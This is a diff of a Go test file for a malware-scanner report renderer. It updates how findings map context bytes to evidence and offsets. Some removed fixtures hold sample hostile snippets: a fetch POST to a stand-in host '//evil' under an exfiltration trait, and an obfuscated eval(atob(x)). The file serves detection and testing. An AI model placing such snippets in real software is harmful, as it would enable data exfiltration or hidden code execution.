@@ -20,23 +20,22 @@ func findMatches(t *testing.T, cats []CategoryGroup, id string) []FindingMatch {
 	return nil
 }
 
-// TestContextProvidesEvidence locks in the v7 path: findings carry no inline
-// `ev`, evidence comes from the file's `ctx` array keyed by full trait ID.
-// A binary (hex) window yields a row with a 0x-formatted offset and no
-// syntax-highlight tokens.
+// TestContextProvidesEvidence locks in the v8 path: a finding's `spans` index
+// into the file's `ctx` bytes, and the evidence column renders the matched
+// content the same way the Content tab does. A binary (hex) window yields a
+// hex+ascii dump, a 0x-formatted offset, and no syntax-highlight tokens.
 func TestContextProvidesEvidence(t *testing.T) {
 	files := []cleaveFile{{
-		Path:     "ext.crx",
-		FileType: "crx",
+		Path:     "stub.bin",
+		FileType: "elf", // binary type → hex view
 		Depth:    0,
 		Findings: []finding{
-			{ID: "objectives/execution/interpreter/eval::dynamic", Crit: 3, Conf: 0.9, Desc: "dynamic eval"},
+			{ID: "objectives/execution/interpreter/eval::dynamic", Crit: 3, Conf: 0.9, Desc: "dynamic eval",
+				Spans: [][2]int64{{0x6b, 4}}},
 		},
 		Ctx: []contextWindow{{
-			Offset: 88,
-			Hex:    true,
-			Text:   "ea fb 32 d5  ..2.",
-			Notes:  []contextNote{{ID: "objectives/execution/interpreter/eval::dynamic", Offset: 107, Crit: 3}},
+			Offset: 0x6b,
+			Data:   []byte{0xea, 0xfb, 0x32, 0xd5},
 		}},
 	}}
 
@@ -49,69 +48,13 @@ func TestContextProvidesEvidence(t *testing.T) {
 		t.Fatalf("expected one match from ctx, got %d: %+v", len(m), m)
 	}
 	if m[0].Evidence != "ea fb 32 d5  ..2." {
-		t.Errorf("evidence = %q, want the ctx window text", m[0].Evidence)
+		t.Errorf("evidence = %q, want the hex dump of the ctx bytes", m[0].Evidence)
 	}
 	if m[0].Location != "0x6b" {
 		t.Errorf("location = %q, want hex offset 0x6b (107)", m[0].Location)
 	}
 	if m[0].Tokens != nil {
 		t.Errorf("hex evidence should not be syntax-highlighted, got %d tokens", len(m[0].Tokens))
-	}
-}
-
-// TestInlineEvidenceFallback confirms older reports — inline `ev`, no `ctx` —
-// still produce expandable match rows, highlighted by the source filename.
-func TestInlineEvidenceFallback(t *testing.T) {
-	files := []cleaveFile{{
-		Path:     "payload.js",
-		FileType: "javascript",
-		Depth:    0,
-		Findings: []finding{
-			{ID: "objectives/execution/interpreter/eval::call", Crit: 3, Conf: 0.9, Desc: "eval", Evidence: []string{"eval(atob(x))"}},
-		},
-	}}
-
-	got := buildStructuredFindings(files)
-	m := findMatches(t, got[0].Categories, "execution/interpreter")
-	if len(m) != 1 {
-		t.Fatalf("expected one inline match, got %d", len(m))
-	}
-	if m[0].Evidence != "eval(atob(x))" {
-		t.Errorf("evidence = %q, want inline ev", m[0].Evidence)
-	}
-	if len(m[0].Tokens) == 0 {
-		t.Error("a .js evidence string should be syntax-highlighted")
-	}
-}
-
-// TestContextPreferredOverInline ensures that when a finding has both ctx
-// attribution and stale inline evidence, ctx wins (the newer, richer source).
-func TestContextPreferredOverInline(t *testing.T) {
-	files := []cleaveFile{{
-		Path:     "a.js",
-		FileType: "javascript",
-		Depth:    0,
-		Findings: []finding{{
-			ID: "objectives/exfiltration/http::post", Crit: 3, Conf: 0.9, Desc: "post",
-			Evidence: []string{"STALE"},
-		}},
-		Ctx: []contextWindow{{
-			Offset: 12,
-			Text:   "fetch('//evil', {method:'POST'})",
-			Notes:  []contextNote{{ID: "objectives/exfiltration/http::post", Offset: 12}},
-		}},
-	}}
-
-	got := buildStructuredFindings(files)
-	m := findMatches(t, got[0].Categories, "exfiltration")
-	if len(m) != 1 {
-		t.Fatalf("expected one match, got %d", len(m))
-	}
-	if strings.Contains(m[0].Evidence, "STALE") {
-		t.Errorf("inline evidence should be shadowed by ctx, got %q", m[0].Evidence)
-	}
-	if m[0].Location != "12" {
-		t.Errorf("location = %q, want decimal offset 12 for a text window", m[0].Location)
 	}
 }
 
@@ -124,11 +67,12 @@ func TestArchiveContextEvidence(t *testing.T) {
 		{Path: "bundle.zip", SHA256: containerSHA, Depth: 0},
 		{
 			Path: "bundle.zip!!pkg/index.js", SHA256: innerSHA, FileType: "javascript", Depth: 1,
-			Findings: []finding{{ID: "objectives/execution/interpreter/eval::call", Crit: 3, Conf: 0.9, Desc: "eval"}},
+			Findings: []finding{{ID: "objectives/execution/interpreter/eval::call", Crit: 3, Conf: 0.9, Desc: "eval",
+				Spans: [][2]int64{{40, 7}}}},
 			Ctx: []contextWindow{{
 				Offset: 40,
-				Text:   "eval(s)",
-				Notes:  []contextNote{{ID: "objectives/execution/interpreter/eval::call", Offset: 40}},
+				Addr:   ptrInt64(40),
+				Data:   []byte("eval(s)"),
 			}},
 		},
 	}
